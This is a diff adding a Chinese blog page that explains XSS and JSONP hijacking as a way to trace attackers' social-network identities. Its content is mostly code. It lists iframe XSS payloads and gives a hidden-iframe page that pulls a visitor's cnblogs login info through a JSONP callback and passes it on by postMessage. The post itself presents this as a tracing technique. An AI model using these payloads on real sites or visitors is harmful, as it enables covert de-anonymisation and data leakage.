@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="icon" href="/img/favicon.ico">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta property="og:description" name='description' content="可乐博客" />
+    <title>可乐博客</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+    <header class="mod-head">
+    <h1 class="mod-head__title"></h1>
+    <div class="mod-head__logo">
+        <a>
+            <img class="avatar" src="/img/ilogo.png" alt="" width="26" height="26">
+        </a>
+    </div>
+
+    <nav class="mod-head__nav">
+        <ul id="menu" class="mod-head__ul">
+            
+                <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14">
+                    <a href="/">
+                        Home
+                    </a>
+                    <span>·</span>
+                </li>
+                
+                <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14">
+                    <a href="/share">
+                        Share
+                    </a>
+                    <span>·</span>
+                </li>
+                
+                <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14">
+                    <a href="/pay">
+                        Pay
+                    </a>
+                    <span>·</span>
+                </li>
+                
+                <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14">
+                    <a href="/link">
+                        Link
+                    </a>
+                    <span>·</span>
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+
+    <article class="post">
+    <div class="post-title">
+        <h2 class="title" style="font-size: 20px;">
+            浅谈XSS注入到黑客溯源
+        </h2>
+    </div>
+    <div class="post-content">
+        <h4 id="社交id溯源"><a href="#社交id溯源" class="headerlink" title="社交id溯源"></a>社交id溯源</h4><p>社交id溯源的原理是，利用iFrame注入js脚本，动态添加jsonp的src实现外带cookies，但是在高版本chrome已经失效</p>
+<p>这里测试使用的是chrome75，之前先要了解js callback机制</p>
+<h4 id="callback机制"><a href="#callback机制" class="headerlink" title="callback机制"></a>callback机制</h4><p>调用的接口会返回一个函数体，直接执行callback函数</p>
+<h4 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (IE)</span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (Firefox, Chrome, Safari)</span><br></pre></td></tr></table></figure>
+<h4 id="多种利用方式如下："><a href="#多种利用方式如下：" class="headerlink" title="多种利用方式如下："></a>多种利用方式如下：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (IE)  </span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;vbscript:msgbox(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (Firefox, Chrome, Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> (Firefox, Chrome, Safari)</span><br><span class="line">http://target.com/something.jsp?query=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>#alert(1)</span><br></pre></td></tr></table></figure>
+<h4 id="整理payload"><a href="#整理payload" class="headerlink" title="整理payload"></a>整理payload</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Jsonp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Jsonp --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- cnblogs --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;eval(name)&lt;/script&gt;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">name</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">    window.test = function(data) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">        let s = &#123;source: &#x27;cnblogs&#x27;, d: data&#125;; </span></span></span><br><span class="line"><span class="string"><span class="tag">        window.parent.postMessage(s, &#x27;*&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">    &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">    let s = document.createElement(&#x27;script&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">    s.src = &#x27;https://passport.cnblogs.com/user/LoginInfo?callback=test&#x27;</span></span></span><br><span class="line"><span class="string"><span class="tag">    document.documentElement.appendChild(s);</span></span></span><br><span class="line"><span class="string"><span class="tag">&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border-width: 0px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(event.data);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+    <div class="post-meta">
+        <span class="post-time">
+            2021/05
+        </span>
+    </div>
+</article>
+
+<style>
+    .post-time {
+        font-size: 14px;
+        color: #777;
+    }
+</style>
+
+
+<link rel="stylesheet" href="/css/shCoreEclipse.css">
+
+
+
+    <footer class="mod-footer" role="contentinfo" id="footer_in">
+    <p class="f_bq" style="text-align: center;"><span id='tellu'><span></p>
+    <p class="f_bq" style="text-align: center;">
+        <a class="banquan" target="_blank" href="https://hexo.io/">Hexo</a>
+        <a style="margin-left: 8px;margin-right: 5px;">·</a>
+        <a class="banquan" target="_blank" href="/">Themes</a>
+        <a style="margin-left: 8px;margin-right: 5px;">·</a>
+        <a class="banquan" target="_blank" href="https://pages.github.com">Github Pages</a>
+        <a style="margin-left: 8px;margin-right: 5px;">·</a>
+        <a class="banquan" target="_blank" href="/sitemap.xml">Sitemap</a>
+        <a style="margin-left: 8px;margin-right: 5px;">·</a>
+        <a class="banquan" target="_blank" href="/baidusitemap.xml" hidden>BaiduSitemap></a>
+        Copyright &copy;2022 <a class="banquan" target="_blank" href="mailto:kele@masong.me">KELE</a>
+    </p>
+</footer>
+
+
+    <a href="https://github.com/buyaoyongroot" class="github-corner" target="_blank" title="Follow me on GitHub">
+    <svg width="60" height="60" viewBox="0 0 250 250"
+        style="fill:#151513; color:#fff; z-index: 999999; position: fixed; top: 0; border: 0; left: 0; transform: scale(-1, 1);"
+        aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path
+            d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+            fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path
+            d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+            fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+
+
+    
+<script src="/js/scrollbar.js"></script>
+
+    
+<script src="/js/tellu.js"></script>
+
+</body>
+
+</html>
